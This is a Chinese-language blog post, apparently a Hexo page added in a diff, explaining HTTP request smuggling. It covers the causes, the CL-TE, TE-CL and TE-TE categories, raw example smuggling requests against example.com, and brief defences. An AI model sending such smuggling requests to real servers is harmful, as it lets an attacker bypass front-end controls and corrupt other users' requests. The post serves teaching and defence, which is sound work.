@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="HTTP 请求走私简介HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术，最早在 2005 年的一篇 文章 中被提出。 成因请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 Content-Length 和 Transfer-Encoding 标头。 分类 CLTE：前端服务器使用 Content">
+<meta property="og:type" content="article">
+<meta property="og:title" content="http请求走私">
+<meta property="og:url" content="http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/index.html">
+<meta property="og:site_name" content="frozenfish">
+<meta property="og:description" content="HTTP 请求走私简介HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术，最早在 2005 年的一篇 文章 中被提出。 成因请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 Content-Length 和 Transfer-Encoding 标头。 分类 CLTE：前端服务器使用 Content">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-12-25T18:01:50.000Z">
+<meta property="article:modified_time" content="2023-12-27T13:48:06.035Z">
+<meta property="article:author" content="frozenfish">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>http请求走私</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/12/26/csrf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&text=http请求走私"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&is_video=false&description=http请求走私"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=http请求走私&body=Check out this article: http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&name=http请求走私&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&t=http请求走私"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.</span> <span class="toc-text">HTTP 请求走私</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cl%E4%B8%8D%E4%B8%BA0%E7%9A%84GET%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.1.</span> <span class="toc-text">cl不为0的GET请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-CL"><span class="toc-number">1.4.2.</span> <span class="toc-text">CL-CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE"><span class="toc-number">1.4.3.</span> <span class="toc-text">CL-TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL"><span class="toc-number">1.4.4.</span> <span class="toc-text">TE-CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-TE"><span class="toc-number">1.4.5.</span> <span class="toc-text">TE-TE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.5.</span> <span class="toc-text">防御</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        http请求走私
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">frozenfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-25T18:01:50.000Z" class="dt-published" itemprop="datePublished">2023-12-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="HTTP-请求走私"><a href="#HTTP-请求走私" class="headerlink" title="HTTP 请求走私"></a>HTTP 请求走私</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术，最早在 2005 年的一篇 <a target="_blank" rel="noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">文章</a> 中被提出。</p>
+<h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
+<li>CLTE：前端服务器使用 <code>Content-Length</code> 头，后端服务器使用 <code>Transfer-Encoding</code> 头</li>
+<li>TECL：前端服务器使用 <code>Transfer-Encoding</code> 标头，后端服务器使用 <code>Content-Length</code> 标头。</li>
+<li>TETE：前端和后端服务器都支持 <code>Transfer-Encoding</code> 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</li>
+</ul>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="cl不为0的GET请求"><a href="#cl不为0的GET请求" class="headerlink" title="cl不为0的GET请求"></a>cl不为0的GET请求</h3><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 <code>Content-Length</code> 头，不进行处理。例如下面这个例子：</p>
+<pre><code>GET / HTTP/1.1\r\n
+Host: example.com\r\n
+Content-Length: 44\r\n
+
+GET /secret HTTP/1.1\r\n
+Host: example.com\r\n
+\r\n
+</code></pre>
+<p>前端服务器处理了 <code>Content-Length</code> ，而后端服务器没有处理 <code>Content-Length</code> ，基于pipeline机制认为这是两个独立的请求，就造成了漏洞的发生。</p>
+<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><p>根据RFC 7230，当服务器收到的请求中包含两个 <code>Content-Length</code> ，而且两者的值不同时，需要返回400错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 <code>Content-Length</code> 值时，就会出现漏洞。例如：</p>
+<pre><code>POST / HTTP/1.1\r\n
+Host: example.com\r\n
+Content-Length: 8\r\n
+Content-Length: 7\r\n
+
+12345\r\n
+a
+</code></pre>
+<p>这个例子中a就会被带入下一个请求，变为 <code>aGET / HTTP/1.1\r\n</code> 。</p>
+<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>CL-TE指前端服务器处理 <code>Content-Length</code> 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 <code>Content-Length</code> ，处理 <code>Transfer-Encoding</code> 。例如：</p>
+<pre><code>POST / HTTP/1.1\r\n
+Host: example.com\r\n
+...
+Connection: keep-alive\r\n
+Content-Length: 6\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+a
+</code></pre>
+<p>这个例子中a同样会被带入下一个请求，变为 <code>aGET / HTTP/1.1\r\n</code> 。</p>
+<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>TE-CL指前端服务器处理 <code>Transfer-Encoding</code> 请求头，而后端服务器处理 <code>Content-Length</code> 请求头。例如：</p>
+<pre><code>POST / HTTP/1.1\r\n
+Host: example.com\r\n
+...
+Content-Length: 4\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+12\r\n
+aPOST / HTTP/1.1\r\n
+\r\n
+0\r\n
+\r\n
+</code></pre>
+<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>TE-TE指前后端服务器都处理 <code>Transfer-Encoding</code> 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 <code>Transfer-encoding</code> ，测试例如：</p>
+<pre><code>POST / HTTP/1.1\r\n
+Host: example.com\r\n
+...
+Content-length: 4\r\n
+Transfer-Encoding: chunked\r\n
+Transfer-encoding: cow\r\n
+\r\n
+5c\r\n
+aPOST / HTTP/1.1\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 15\r\n
+\r\n
+x=1\r\n
+0\r\n
+\r\n
+</code></pre>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>禁用后端连接重用</li>
+<li>确保连接中的所有服务器具有相同的配置</li>
+<li>拒绝有二义性的请求</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.</span> <span class="toc-text">HTTP 请求走私</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cl%E4%B8%8D%E4%B8%BA0%E7%9A%84GET%E8%AF%B7%E6%B1%82"><span class="toc-number">1.4.1.</span> <span class="toc-text">cl不为0的GET请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-CL"><span class="toc-number">1.4.2.</span> <span class="toc-text">CL-CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE"><span class="toc-number">1.4.3.</span> <span class="toc-text">CL-TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL"><span class="toc-number">1.4.4.</span> <span class="toc-text">TE-CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-TE"><span class="toc-number">1.4.5.</span> <span class="toc-text">TE-TE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.5.</span> <span class="toc-text">防御</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&text=http请求走私"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&is_video=false&description=http请求走私"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=http请求走私&body=Check out this article: http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&title=http请求走私"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&name=http请求走私&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/26/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/&t=http请求走私"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    frozenfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
